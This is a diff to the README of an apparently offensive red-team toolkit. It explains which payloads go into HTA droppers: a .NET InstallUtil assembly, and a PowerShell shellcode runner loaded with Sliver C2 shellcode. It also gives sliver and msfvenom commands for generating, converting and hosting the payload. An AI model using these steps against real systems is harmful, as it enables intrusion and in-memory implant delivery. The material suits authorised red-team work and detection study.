@@ -15,7 +15,7 @@
 | File | Placeholder | What it must be |
 |---|---|---|
 | `black.hta` | `shell.exe` | A **.NET InstallUtil payload** — a compiled C# assembly with a `[RunInstaller(true)]` installer class. **Not** a raw Go/Sliver implant: `InstallUtil.exe /U` only loads and executes *.NET* installer assemblies. |
-| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. `ps-loaders/ps-shellcode-runner.ps1` with a Sliver shellcode byte array (via `sliver2arrays.py --ps1`), or a simple download cradle. |
+| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. `ps-loaders/ps-shellcode-runner.ps1` with a Sliver shellcode byte array (via `msfvenom -f ps1`), or a simple download cradle. |
 
 ### Why `black.hta` needs a .NET payload (not a Go implant)
 
@@ -91,7 +91,7 @@ sliver > mtls --lhost <IP> --lport 443
 PowerShell array, then feed it into `ps-loaders/ps-shellcode-runner.ps1`:
 ```text
 sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
-python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
+msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/payload.ps1
 ```
 
 **2. Host `payload.ps1` on your HTTP server:**
